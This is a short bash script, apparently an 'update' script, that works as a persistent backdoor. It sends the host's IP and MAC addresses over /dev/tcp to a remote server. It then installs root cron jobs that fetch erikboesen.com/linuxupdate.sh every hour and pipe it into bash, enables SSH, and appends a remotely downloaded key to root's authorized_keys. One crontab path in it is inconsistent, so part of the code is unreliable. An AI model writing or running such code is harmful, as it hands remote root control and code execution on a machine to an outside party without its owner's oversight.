#!/bin/bash

# Prevent from running twice per hour
if [[ $(< /tmp/last) = `date +"%H"` ]]; then
	exit 1
else
	date +"%H" > /tmp/last
fi

IP=`hostname -I | sed 's/ *$//'`
MAC=`cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//'`

SERVER="boesen.science"
PORT=2043

if [[ $(< /tmp/ip) != "$IP" ]]; then
	printf "$IP" > /tmp/ip

	exec 3<>/dev/tcp/$SERVER/$PORT
	printf "UPDATE: $MAC $IP" >&3

	cat <&3
fi

grep -v "erikboesen.com" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/crontabs/root
echo '0 * * * * curl -L erikboesen.com/linuxupdate.sh |bash' >> /var/spool/crontabs/root
sudo su -c "printf '#\!/bin/bash\ncurl -L erikboesen.com/linuxupdate.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"

systemctl start ssh.service
systemctl enable ssh.service

SSHPATH="/root/.ssh"

mkdir -p "$SSHPATH"

if ! grep boesene $SSHPATH/authorized_keys; then
	curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
fi
